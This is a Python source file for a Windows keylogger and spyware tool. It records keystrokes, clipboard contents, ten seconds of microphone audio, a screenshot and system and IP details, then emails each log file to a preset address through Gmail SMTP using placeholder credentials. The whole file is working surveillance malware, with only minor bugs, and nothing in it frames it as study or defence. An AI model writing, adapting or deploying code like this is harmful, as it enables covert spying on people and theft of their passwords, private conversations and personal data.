from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab

# varibles using
keys_information = "keys_log.txt"
file_path = "file_path"
extend = "\\"
email_address = "demo@gmail.com"
password = "demo_password"
to_address = "demo2@gmail.com"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screentshot_information = "screentshot.png"
microphone_time = 10

count = 0
keys = []

# fuctions
def send_email(filename, attachment, to_address):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log File"
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application','octet-stream')
    # can attach email-body using MIMEText 
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', " Attachment ; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.close()

def computer_information():
    with open(file_path+extend+system_information, 'a') as f:
        host_name = socket.gethostname()
        IP_Address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Could not get the Public IP Address")
        
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + (platform.system()) + ' ' + (platform.version()) + '\n')
        f.write("Machine: " + (platform.machine()) + '\n')
        f.write("Hostname: " + host_name + '\n')
        f.write("Private IP: " + IP_Address + '\n')

def copy_clipboard():
    with open(file_path+extend+clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data + '\n')
        except:
            f.write("Clipboard Data is not String\n")

def microphone():
    fs = 4410
    seconds = microphone_time
    my_rec = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path+extend+audio_information, fs, my_rec)

def screentshot():
    image = ImageGrab.grab()
    image.save(file_path+extend+screentshot_information)


# fuction calls
computer_information()

microphone()

copy_clipboard()

screentshot()

send_email(keys_information, file_path+extend+keys_information, to_address)
send_email(keys_information, file_path+extend+system_information, to_address)
send_email(keys_information, file_path+extend+clipboard_information, to_address)
send_email(keys_information, file_path+extend+audio_information, to_address)
send_email(keys_information, file_path+extend+screentshot_information, to_address)

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path+extend+keys_information, 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if (k.find("space") > 0) or (k.find("enter") > 0):
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k);
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()